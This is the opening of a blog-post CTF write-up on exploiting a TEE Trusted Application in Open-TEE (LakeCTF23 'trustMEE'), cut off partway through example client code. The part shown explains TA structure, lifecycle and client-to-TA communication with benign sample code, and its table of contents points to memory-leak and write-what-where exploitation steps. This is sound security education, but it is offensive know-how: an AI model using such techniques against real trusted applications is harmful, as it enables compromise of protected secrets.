@@ -1,0 +1,895 @@
+<!doctype html><html lang=en><head><meta name=viewport content="width=device-width"><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=7"><link rel=icon href=/cyberpunk-cat32x32.png><link rel="shortcut icon" href=/cyberpunk-cat32x32.ico type=image/x-icon><link rel=apple-touch-icon href=/cyberpunk-cat180x180.png><title>Pwning a TEE Trusted Application - LakeCTF23 &ndash;
+Nikolaos Chalkiadakis
+</title><link href=/symbols-nerd-font/symbols-nerd-font.css rel=stylesheet integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="><link href=/jetbrains-mono/jetbrains-mono.css rel=stylesheet integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="><link type=text/css rel=stylesheet href=https://chalkiadakis.me/css/styles.78454e95bc3bb7af4e371fd1e897fd1c4968c37e56603d2b366f4d9a8658e4299369f4de03647cf0e68420ad45571fa6f27c00e694f28e7b83274e512e314f00.css integrity="sha512-eEVOlbw7t69ONx/R6Jf9HElow35WYD0rNm9NmoZY5CmTafTeA2R88OaEIK1FVx+m8nwA5pTyjnuDJ05RLjFPAA=="><script type=text/javascript src=/fontawesome/all.min.js></script><meta name=author content="Nikolaos Chalkiadakis"><meta name=keywords content="ctf,environment setup,lakeCTF,pwn,TA,TEE"><meta name=description content="guide to start pwning TAs from the REE"><meta property="og:site_name" content="Nikolaos Chalkiadakis"><meta property="og:title" content="Pwning a TEE Trusted Application - LakeCTF23"><meta property="og:type" content="article"><meta property="article:author" content="Nikolaos Chalkiadakis"><meta property="article:published_time" content="2023-12-31T00:00:01Z+0000"><meta property="article:tag" content="ctf"><meta property="article:tag" content="environment setup"><meta property="article:tag" content="lakeCTF"><meta property="article:tag" content="pwn"><meta property="article:tag" content="TA"><meta property="article:tag" content="TEE"><meta property="og:url" content="https://chalkiadakis.me/posts/trustmee/trust-mee/"><meta property="og:image" content="https://chalkiadakis.me/post-resources/TrustMEE/i-trusted-you-meme.jpg"><meta property="og:description" content="A beginner-friendly guide to start pwning TAs from the REE"><meta name=twitter:card content="summary_large_image"><meta property="twitter:domain" content="chalkiadakis.me"><meta property="twitter:url" content="https://chalkiadakis.me/posts/trustmee/trust-mee/"><meta name=twitter:title content="Pwning a TEE Trusted Application - LakeCTF23"><meta name=twitter:image content="https://chalkiadakis.me/post-resources/TrustMEE/i-trusted-you-meme.jpg"><meta name=twitter:description content="A beginner-friendly guide to start pwning TAs from the REE"><link rel=manifest href=/manifest/index.json></head><body><div id=baseContainer><header><div class=titleAndSearchContainer><div id=titleContainer><a class=unstyledLink href=/><img src=/cyberpunk-cat512x512.png alt=Logo></a><div class=rightOfLogo><div class=titleAndHamburger><h1><a class=unstyledLink href=/>Nikolaos Chalkiadakis</a></h1></div><div id=wide_nav><nav><ul id=main-nav><li><a href=/>Home</a></li><li><a href=/posts>Posts</a></li><li><a href=/whoami/>whoami</a></li><li><a href=/tags>Tags</a></li></ul></nav></div></div></div><div class=search><input id=searchbar type=text placeholder=Search>
+<a class=nerdlink onclick=newSearch()>&#xf002;</a></div><script>function newSearch(){let e=searchbar.value.trim();if(!e)return;location.href=`/search?q=${e}`}searchbar.onkeyup=e=>{e.keyCode==13&&newSearch()}</script></div><div id=links><a rel=noreferrer target=_blank class=nerdlink href=https://github.com/nikosChalk>&#xf09b;
+<span>GitHub
+</span></a><a rel=noreferrer target=_blank class=nerdlink href=https://www.linkedin.com/in/chalkn>&#xf0e1;
+<span>LinkedIn
+</span></a><a rel=noreferrer target=_blank class=nerdlink href=https://ctftime.org/user/128082><img src=/ctf-timefavicon.png width=14px>
+<span>CTFTime</span></a></div></header><div id=contentContainer><div id=content><main><article class="card single"><h1>Pwning a TEE Trusted Application - LakeCTF23</h1><p class=date><span title=Date> </span>2023, December 31</p><div class=articleToc style=display:flex><div><nav id=TableOfContents><ul><li><a href=#1-introduction>1. Introduction</a></li><li><a href=#2-reversing-the-ta>2. Reversing the TA</a></li><li><a href=#3-detour-ta-crash-course>3. Detour! TA crash course!</a><ul><li><a href=#31-ta-structure-and-lifecycle>3.1 TA Structure and Lifecycle</a></li><li><a href=#32-client-ree-to-ta-tee-communication>3.2 Client (REE) to TA (TEE) communication</a></li><li><a href=#33-parameters-and-ta-commands>3.3 Parameters and TA commands</a></li><li><a href=#34-security-considerations>3.4 Security considerations</a></li></ul></li><li><a href=#4-reversing-revisited>4. Reversing revisited!</a><ul><li><a href=#41-identifying-the-bugs>4.1 Identifying the bugs</a></li></ul></li><li><a href=#5-detour-environment-setup>5. Detour! Environment setup</a><ul><li><a href=#51-creating-a-client-application-ca>5.1 Creating a Client Application (CA)</a></li><li><a href=#52-debugging>5.2 Debugging</a><ul><li><a href=#521-debugging-from-the-very-beginning>5.2.1 Debugging from the very beginning</a></li><li><a href=#522-attaching-a-debugger-to-a-ta-instance>5.2.2 Attaching a debugger to a TA instance</a></li></ul></li></ul></li><li><a href=#6-identifying-an-exploitation-strategy>6. Identifying an exploitation strategy</a></li><li><a href=#7-writing-the-exploit>7. Writing the exploit</a><ul><li><a href=#71-libcso-leak>7.1 <code>libc.so</code> leak</a></li><li><a href=#72-grade_taso-leak>7.2 <code>grade_ta.so</code> leak</a></li><li><a href=#73-write-what-where-primitive>7.3 Write-what-where primitive</a></li></ul></li></ul></nav></div><div style=flex:1><figure style=margin:0><img src=/post-resources/TrustMEE/i-trusted-you-meme.jpg alt></figure></div></div><hr><div><p>Categories: Pwn</p><p>Description:</p><blockquote><p>the grades are stored securely in a trusted execution environment, maybe just learning for the course would have been easier&mldr;</p><p><code>nc chall.polygl0ts.ch 9002</code></p><p>authors: LakeCTF 2023 organizers</p><p><a href=https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/Dockerfile target=_blank rel="noopener noreferrer">Dockerfile</a>, <a href=https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/grade_ta.so target=_blank rel="noopener noreferrer">grade_ta.so</a>, <a href=https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/grade_ca.c target=_blank rel="noopener noreferrer">grade_ca.c</a>, <a href=https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/grade_ca.h target=_blank rel="noopener noreferrer">grade_ca.h</a>, <a href=https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/run.sh target=_blank rel="noopener noreferrer">run.sh</a>, <a href=https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/opentee.conf target=_blank rel="noopener noreferrer">opentee.conf</a>, <a href=https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/exploit_template.py target=_blank rel="noopener noreferrer">exploit_template.py</a></p></blockquote><hr><h2 id=1-introduction>1. Introduction</h2><p>In this challenge, we are presented with a Trusted Application (TA) and our goal is to pwn it. We will write a Client Application (CA) that communicates with the TA through the OS and TEE environment. The focus of this writeup will be audience with no or little experience in TEE exploitation, TA development, and environment setup. We will assume that the reader has a high level understanding of what a TEE is but no knowledge of how a TA works or is implemented.</p><p>In this challenge, the TA is running inside <a href=https://open-tee.github.io/ target=_blank rel="noopener noreferrer">Open-TEE</a>, which is an open-source project implementing a &ldquo;virtual TEE&rdquo; compliant with the recent GlobalPlatform TEE specifications. The GlobalPlatform TEE specifications are nothing more than just &ldquo;specifications&rdquo;, i.e. they describes what APIs are available and their behavior for a TA and a CA to use. The implementation of those APIs is left to actual TEE implementation such as Open-TEE, OP-TEE, Teegris, etc and to kernel drivers.</p><p>With that said, one thing to clear out of the way is that <a href=https://open-tee.github.io/ target=_blank rel="noopener noreferrer">Open-TEE</a> and <a href=https://optee.readthedocs.io/en/latest/general/about.html target=_blank rel="noopener noreferrer">OP-TEE</a> are two different things. Both are TEE implementations but their goal is different. Open-TEE is an emulation of an actual TEE, with the goal of facilitating developers and researchers to write TAs without any actual hardware. There is no real memory isolation mechanism in-place. The kernel and the TEE run with the same privileges. On the other hand, OP-TEE, is a TEE implementation designed as companion to a Linux kernel running on Arm; Cortex-A cores using the TrustZone technology. OP-TEE is designed primarily to rely on the Arm TrustZone technology as the underlying hardware isolation mechanism.</p><p>Although in this challenge the TA is not running under a real hardware-based TEE, the exploitation process remains the same. If you are interested in more about Open-TEE, you can optionally read its paper: <a href=https://arxiv.org/pdf/1506.07367.pdf target=_blank rel="noopener noreferrer">Open-TEE — An Open Virtual Trusted Execution Environment [paper]</a>.</p><h2 id=2-reversing-the-ta>2. Reversing the TA</h2><p>In this challenge, we are not given the source code of the TA. Instead, we are just given the <code>grade_ta.so</code> binary.</p><p><img src=/post-resources/TrustMEE/file.png alt=file></p><p>Fortunately, the binary is not stripped. So, let&rsquo;s load it into Ghidra. Here are the functions defined in this TA:</p><p><img src=/post-resources/TrustMEE/functions.png alt=functions></p><p>But now what? There are a few things that we need to understand before we jump into reversing:</p><ol><li>The structure of a TA</li><li>The lifecycle of a TA</li><li>How to communicate with a TA</li></ol><h2 id=3-detour-ta-crash-course>3. Detour! TA crash course!</h2><p>As an example TA implementation, we will use the <a href=https://github.com/Open-TEE/TAs/blob/master/example_digest_ta target=_blank rel="noopener noreferrer"><code>digest_ta</code></a> example provided by Open-TEE. This is a TA which you simply give a buffer as parameter and the TA calculates the hash for you. Of course there is no real meaning in such a TA to exist other than demonstration purposes.</p><p>The source code of the TA is found in <a href=https://github.com/Open-TEE/TAs/blob/master/example_digest_ta/example_digest_ta.c target=_blank rel="noopener noreferrer">example_digest_ta.c</a>. An example CA implementation is shown in <a href=https://github.com/Open-TEE/CAs/blob/master/example_sha1_ca/example_sha1_ca.c target=_blank rel="noopener noreferrer">example_sha1_ca.c</a> which performs some SHA1 hashing.</p><p>The Open-TEE implements the version 1.0.26 of the GP Core API. Several items were raised to GP during the implementation of Open-TEE which resulted in the release of version 1.1.</p><p><strong>The TEE Internal Core API</strong> is the API that is exposed to the TAs and can be found in <a href=https://globalplatform.org/wp-content/uploads/2018/04/GPD_TEE_Internal_Core_API_Specification_v1.1.1_20160614.pdf target=_blank rel="noopener noreferrer">TEE Internal Core API v1.1</a>. The <strong>The TEE Client API</strong> describes and defines how a CA running in the REE should communicate with TAs running in the TEE and can be bound in <a href=https://globalplatform.org/wp-content/uploads/2010/07/TEE_Client_API_Specification-V1.0.pdf target=_blank rel="noopener noreferrer">TEE Client API v1.0</a>.</p><h3 id=31-ta-structure-and-lifecycle>3.1 TA Structure and Lifecycle</h3><p>Trusted Applications are command-oriented. A CA opens a session with them and invokes commands within those sessions. TAs are uniquely identifiable by a UUID. That UUID is used by CAs to specify which TA they wish to communicate with. Let&rsquo;s examine the SHA1 example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>/* UUID must be unique */</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>SET_TA_PROPERTIES</span>(
+</span></span><span style=display:flex><span>  { <span style=color:#ae81ff>0x12345678</span>, <span style=color:#ae81ff>0x8765</span>, <span style=color:#ae81ff>0x4321</span>, { <span style=color:#e6db74>&#39;D&#39;</span>, <span style=color:#e6db74>&#39;I&#39;</span>, <span style=color:#e6db74>&#39;G&#39;</span>, <span style=color:#e6db74>&#39;E&#39;</span>, <span style=color:#e6db74>&#39;S&#39;</span>, <span style=color:#e6db74>&#39;T&#39;</span>, <span style=color:#e6db74>&#39;0&#39;</span>, <span style=color:#e6db74>&#39;0&#39;</span>} }, <span style=color:#75715e>/* UUID */</span>
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>512</span>, <span style=color:#75715e>/* dataSize */</span>
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>255</span>, <span style=color:#75715e>/* stackSize */</span>
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>1</span>, <span style=color:#75715e>/* singletonInstance */</span>
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>1</span>, <span style=color:#75715e>/* multiSession */</span>
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>1</span>) <span style=color:#75715e>/* instanceKeepAlive */</span>
+</span></span></code></pre></div><p>First, some properties are defined for the TA. The UUID of this TA is <code>{ 0x12345678, 0x8765, 0x4321, { 'D', 'I', 'G', 'E', 'S', 'T', '0', '0'} },</code> which is of type <code>TEE_UUID</code>. Next, data sizes. Next, it defines that this is a single instance TA. Generally, TAs can be either <strong>Multi-Instance</strong> or <strong>Single-Instance</strong>. Multi-Instance means that each session opened by a client is directed to a separate TA instance, created on demand when the session is opened and destroyed when the session closes. Single-Instance on the other hand means that all sessions opened by the clients are directed to a single TA instance.</p><p>Next, the <code>multiSession</code> is set to enabled. This means that the TA can accept multiple concurrent sessions. This property only makes sense for Single-Instance TAs and for Multi-Instance TAs it is ignored. If <code>multiSession</code> is not enabled and the TA already has an active session, other CAs attempting to establish a session will fail.</p><p>Finally, <code>instanceKeepAlive</code> is set to enabled. This means that the TA instance will be preserved when there are no sessions connected to it.</p><p>Here is also the definition of the <code>SET_TA_PROPERTIES</code> macro and the struct holding the TA properties from the source code of Open-TEE:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#define PROPERTY_SEC_NAME &#34;.ta_properties&#34;
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define SET_TA_PROPERTIES(...)                                                                     \
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  struct gpd_ta_config ta_pro __attribute__((section(PROPERTY_SEC_NAME))) = { __VA_ARGS__ };
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> gpd_ta_config
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  TEE_UUID appID;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> dataSize;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> stackSize;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>bool</span> singletonInstance;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>bool</span> multiSession;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>bool</span> instanceKeepAlive;
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>As we can see, the TA properteis are stored in the <code>.ta_properties</code> section header. So, when we reverse our TA we should look for that section. Let&rsquo;s continue with analyzing the SHA1 example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>/* Hash TA command IDs */</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define HASH_UPDATE    0x00000001
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define HASH_DO_FINAL  0x00000002
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define HASH_RESET     0x00000003
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/* Hash algorithm identifier */</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define HASH_MD5  0x00000001
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define HASH_SHA1 0x00000002
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>TEE_Result TA_EXPORT <span style=color:#a6e22e>TA_CreateEntryPoint</span>(<span style=color:#66d9ef>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>OT_LOG</span>(LOG_ERR, <span style=color:#e6db74>&#34;Calling the create entry point&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> TEE_SUCCESS;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> TA_EXPORT <span style=color:#a6e22e>TA_DestroyEntryPoint</span>(<span style=color:#66d9ef>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>OT_LOG</span>(LOG_ERR, <span style=color:#e6db74>&#34;Calling the Destroy entry point&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TEE_Result TA_EXPORT <span style=color:#a6e22e>TA_OpenSessionEntryPoint</span>(<span style=color:#66d9ef>uint32_t</span> paramTypes,
+</span></span><span style=display:flex><span>                TEE_Param params[<span style=color:#ae81ff>4</span>],
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>void</span> <span style=color:#f92672>**</span>sessionContext)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  algorithm_Identifier hash;
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* ... Determine which hash algorithm to use based on parameters ... */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>TEE_AllocateOperation</span>((TEE_OperationHandle <span style=color:#f92672>*</span>)sessionContext, hash, TEE_MODE_DIGEST, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> TA_EXPORT <span style=color:#a6e22e>TA_CloseSessionEntryPoint</span>(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>sessionContext)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>OT_LOG</span>(LOG_ERR, <span style=color:#e6db74>&#34;Calling the Close session entry point&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>TEE_FreeOperation</span>(sessionContext);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TEE_Result TA_EXPORT <span style=color:#a6e22e>TA_InvokeCommandEntryPoint</span>(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>sessionContext,
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>uint32_t</span> commandID,
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>uint32_t</span> paramTypes,
+</span></span><span style=display:flex><span>            TEE_Param params[<span style=color:#ae81ff>4</span>])
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  TEE_Result tee_rv <span style=color:#f92672>=</span> TEE_SUCCESS;
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* ... Parse command and execute it ... */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> tee_rv;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Let&rsquo;s focus on the following functions:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>TEE_Result <span style=color:#a6e22e>TA_CreateEntryPoint</span>(<span style=color:#66d9ef>void</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span>       <span style=color:#a6e22e>TA_DestroyEntryPoint</span>(<span style=color:#66d9ef>void</span>);
+</span></span><span style=display:flex><span>TEE_Result <span style=color:#a6e22e>TA_OpenSessionEntryPoint</span>(<span style=color:#66d9ef>uint32_t</span> paramTypes, TEE_Param params[<span style=color:#ae81ff>4</span>], <span style=color:#66d9ef>void</span> <span style=color:#f92672>**</span>sessionContext);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span>       <span style=color:#a6e22e>TA_CloseSessionEntryPoint</span>(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>sessionContext);
+</span></span><span style=display:flex><span>TEE_Result <span style=color:#a6e22e>TA_InvokeCommandEntryPoint</span>(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>sessionContext, <span style=color:#66d9ef>uint32_t</span> commandID, <span style=color:#66d9ef>uint32_t</span> paramTypes, TEE_Param params[<span style=color:#ae81ff>4</span>]);
+</span></span></code></pre></div><p>These functions are very similar to what we saw earlier in Ghidra:</p><p><img src=/post-resources/TrustMEE/functions.png alt=functions></p><p>They represent the lifecycle of a TA. When a TA instance is created, the <code>TA_CreateEntryPoint</code> function is invoked — and when the instance is destroyed, <code>TA_DestroyEntryPoint</code> is invoked. Both functions are called only once in the lifetime of a TA instance.</p><p>When a client attempts to open a session with the TA, <code>TA_OpenSessionEntryPoint</code> is invoked. The client can pass up to 4 parameters to the TA when establishing the session. When the client releases the session, <code>TA_CloseSessionEntryPoint</code> is invoked. A <strong>Session</strong> is used to logically connect multiple commands invoked in a TA. Each session has its own state.</p><p><code>TA_InvokeCommandEntryPoint</code> is invoked when the client invokes any command on the TA. A <strong>Command</strong> is issued within the context of a session and contains a Command Identifier, which is a 32-bit integer (<code>uint32_t commandID</code>), and four Operation Parameters, which can contain integer values or references to client-owned shared memory blocks (<code>uint32_t paramTypes, TEE_Param params[4]</code>) It is up to the TA to define the combinations of commands and their parameters that are valid to execute.</p><p>The above functions are called <strong>Entry Points</strong>. All Entry Point calls within a given TA instance are called in sequence, i.e. no more than one Entry Point is executed at any point in time. The Trusted Core Framework implementation guarantees that a commenced Entry Point call is completed before any new Entry Point call is allowed to begin execution. It is not possible to execute multiple concurrent commands within a session. The TEE guarantees that a pending command has completed before a new command is executed. Since all Entry Points of a given TA instance are called in sequence, <strong>there is no need to use any dedicated synchronization mechanisms to maintain consistency of any TA instance memory</strong>. The sequential execution of Entry Points inherently guarantees this consistency.</p><h3 id=32-client-ree-to-ta-tee-communication>3.2 Client (REE) to TA (TEE) communication</h3><p>Okay, now we know enough about TAs. Let&rsquo;s see how we can write a client to communicate with TAs. We will use the SHA1 example again:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;tee_client_api.h&#34;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>const</span> TEEC_UUID uuid <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x12345678</span>, <span style=color:#ae81ff>0x8765</span>, <span style=color:#ae81ff>0x4321</span>, { <span style=color:#e6db74>&#39;D&#39;</span>, <span style=color:#e6db74>&#39;I&#39;</span>, <span style=color:#e6db74>&#39;G&#39;</span>, <span style=color:#e6db74>&#39;E&#39;</span>, <span style=color:#e6db74>&#39;S&#39;</span>, <span style=color:#e6db74>&#39;T&#39;</span>, <span style=color:#e6db74>&#39;0&#39;</span>, <span style=color:#e6db74>&#39;0&#39;</span>}
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/* Data buffer sizes */</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define DATA_SIZE 256
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define SHA1_SIZE 20
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/* Hash TA command IDs for this applet */</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define HASH_UPDATE 0x00000001
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define HASH_DO_FINAL 0x00000002
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define HASH_RESET 0x00000003
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/* Hash algoithm */</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define HASH_MD5 0x00000001
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define HASH_SHA1 0x00000002
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  TEEC_Context context;
+</span></span><span style=display:flex><span>  TEEC_Session session;
+</span></span><span style=display:flex><span>  TEEC_Operation operation;
+</span></span><span style=display:flex><span>  TEEC_SharedMemory in_mem;
+</span></span><span style=display:flex><span>  TEEC_SharedMemory out_mem;
+</span></span><span style=display:flex><span>  TEEC_Result tee_rv;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> data[DATA_SIZE];
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint8_t</span> sha1[SHA1_SIZE];
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> i;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>START: example SHA1 calc app</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* Initialize data stuctures */</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>((<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>in_mem, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(in_mem));
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>((<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>out_mem, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(out_mem));
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>((<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>operation, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(operation));
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(data, <span style=color:#e6db74>&#39;y&#39;</span>, DATA_SIZE);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(sha1, <span style=color:#ae81ff>0</span>, SHA1_SIZE);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* Initialize context towards TEE */</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Initializing context: &#34;</span>);
+</span></span><span style=display:flex><span>  tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_InitializeContext</span>(NULL, <span style=color:#f92672>&amp;</span>context);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (tee_rv <span style=color:#f92672>!=</span> TEEC_SUCCESS) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;TEEC_InitializeContext failed: 0x%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tee_rv);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> end_1;
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;initialized</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* Open session towards Digest TA by specifying the correct UUID */</span>
+</span></span><span style=display:flex><span>  operation.paramTypes <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_PARAM_TYPES</span>(TEEC_VALUE_INPUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);
+</span></span><span style=display:flex><span>  operation.params[<span style=color:#ae81ff>0</span>].value.a <span style=color:#f92672>=</span> HASH_SHA1; <span style=color:#75715e>/* Open session is expecting HASH algorithm */</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Openning session: &#34;</span>);
+</span></span><span style=display:flex><span>  tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_OpenSession</span>(<span style=color:#f92672>&amp;</span>context, <span style=color:#f92672>&amp;</span>session, <span style=color:#f92672>&amp;</span>uuid, TEEC_LOGIN_PUBLIC, NULL, <span style=color:#f92672>&amp;</span>operation, NULL);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (tee_rv <span style=color:#f92672>!=</span> TEEC_SUCCESS) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;TEEC_OpenSession failed: 0x%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tee_rv);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> end_2;
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
